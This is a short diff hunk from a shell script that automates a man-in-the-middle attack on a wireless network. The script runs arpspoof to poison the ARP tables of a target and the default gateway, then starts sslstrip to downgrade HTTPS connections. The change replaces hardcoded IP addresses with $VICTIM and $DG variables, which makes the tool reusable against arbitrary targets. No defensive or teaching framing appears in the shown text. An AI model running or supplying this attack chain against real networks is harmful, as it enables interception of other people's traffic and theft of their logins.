@@ -379,7 +379,7 @@ echo ".."
 sleep 5
 echo "..."
 sleep 5
-gnome-terminal -e arpspoof -i wlan0 -t 10.0.0.6 -r 10.0.0.138
+gnome-terminal -e arpspoof -i wlan0 -t $VICTIM -r $DG
 echo "Start sslstrip -l $REDIRECT on another terminal..."
 sleep 5
 gnome-terminal -e sslstrip -l $REDIRECT
